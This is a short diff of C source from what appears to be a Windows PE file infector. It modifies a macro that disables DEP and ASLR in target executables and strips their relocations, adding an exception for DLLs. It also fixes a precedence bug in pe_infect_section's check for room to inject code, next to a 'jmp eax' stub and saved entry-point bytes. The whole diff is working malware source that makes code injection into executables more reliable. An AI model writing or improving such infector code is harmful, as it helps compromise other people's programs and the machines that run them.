@@ -8,8 +8,10 @@
 
 #define DISABLE_DEP_ASLR nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE; \
 	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED; \
+	if (!(nt_header->nt_file_header.characteristics & IMAGE_FILE_DLL)) { \
 	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0; \
 	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0; \
+	} \
 	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
 
 
@@ -77,7 +79,7 @@ int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsig
 	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
 	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
 	
-	if (codeSect->header.SizeOfRawData - injection_xcode_offset - 8 - thread_flag ? 0x99 : 0 < xcode_size) {
+	if (codeSect->header.SizeOfRawData - injection_xcode_offset - 8 - (thread_flag ? 0x99 : 0) < xcode_size) {
 		//not enough space for xcode
 		return -5;
 	}
